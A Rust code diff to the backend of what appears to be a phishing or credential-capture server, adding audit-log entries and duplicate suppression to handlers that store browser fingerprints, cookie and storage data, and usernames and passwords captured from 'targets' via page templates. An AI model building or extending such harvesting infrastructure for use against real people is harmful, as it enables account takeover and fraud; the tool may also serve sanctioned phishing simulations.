@@ -367,6 +367,20 @@ pub async fn receive_fingerprint(
     }
 
     log_event(&state, &session_id, "fingerprint_collected", serde_json::json!({"has_canvas": gs("canvas_fingerprint").is_some()})).await;
+
+    let has_canvas = gs("canvas_fingerprint").is_some();
+    if has_canvas {
+        let _ = sqlx::query(
+            "INSERT INTO audit_log (id, actor, action, resource_type, resource_id, session_id, details, ip_address, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)"
+        )
+        .bind(uuid::Uuid::new_v4().to_string())
+        .bind("target").bind("capture").bind("fingerprint")
+        .bind(None::<String>).bind(&session_id)
+        .bind(serde_json::json!({"device": device, "browser": browser, "os": os, "has_canvas": has_canvas}).to_string())
+        .bind(&ip).bind(now)
+        .execute(&state.pool).await;
+    }
+
     tracing::info!("🔍 Fingerprint: {} session={}", ip, session_id);
     Ok(StatusCode::OK)
 }
@@ -414,6 +428,21 @@ pub async fn receive_storage(
         .filter(|&&k| body.extra.get(k).is_some())
         .copied()
         .collect();
+
+    let cookie_count = body.extra.get("cookies")
+        .and_then(|c| c.as_object())
+        .map(|o| o.len())
+        .unwrap_or(0);
+    let _ = sqlx::query(
+        "INSERT INTO audit_log (id, actor, action, resource_type, resource_id, session_id, details, ip_address, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)"
+    )
+    .bind(uuid::Uuid::new_v4().to_string())
+    .bind("target").bind("capture").bind("storage")
+    .bind(Some(&id)).bind(&session_id)
+    .bind(serde_json::json!({"key_types": key_types, "cookie_count": cookie_count}).to_string())
+    .bind(&ip).bind(now)
+    .execute(&state.pool).await;
+
     log_event(&state, &session_id, "storage_captured", serde_json::json!({
         "key_types": key_types,
     })).await;
@@ -434,6 +463,18 @@ pub async fn receive_credentials(
     let session_id = get_session(&payload.session);
     let now = chrono::Utc::now().timestamp();
 
+    let recent: Option<(Option<String>, Option<String>, Option<String>, i64)> = sqlx::query_as(
+        "SELECT username, password, template_id, created_at FROM credentials WHERE session_id = ? AND ip_address = ? ORDER BY created_at DESC LIMIT 1"
+    ).bind(&session_id).bind(&ip)
+    .fetch_optional(&state.pool).await.map_err(|_| StatusCode::INTERNAL_SERVER_ERROR)?;
+
+    if let Some((u, p, t, ts)) = recent {
+        if now - ts < 300 && u == payload.username && p == payload.password && t == payload.template_id {
+            tracing::debug!("🔑 Duplicate credentials skipped for session {}", session_id);
+            return Ok(StatusCode::OK);
+        }
+    }
+
     sqlx::query(
         "INSERT INTO credentials (id, session_id, template_id, username, password, email, phone, ip_address, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)"
     )
@@ -446,6 +487,16 @@ pub async fn receive_credentials(
         "template": payload.template_id,
         "username": payload.username.is_some(),
     })).await;
+
+    let _ = sqlx::query(
+        "INSERT INTO audit_log (id, actor, action, resource_type, resource_id, session_id, details, ip_address, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)"
+    )
+    .bind(uuid::Uuid::new_v4().to_string())
+    .bind("target").bind("capture").bind("credential")
+    .bind(payload.template_id.as_deref()).bind(&session_id)
+    .bind(serde_json::json!({"username": payload.username.is_some(), "template": payload.template_id}).to_string())
+    .bind(&ip).bind(now)
+    .execute(&state.pool).await;
 
     tracing::info!("🔑 Credentials: {} session={}", payload.username.as_deref().unwrap_or("?"), session_id);
     Ok(StatusCode::OK)
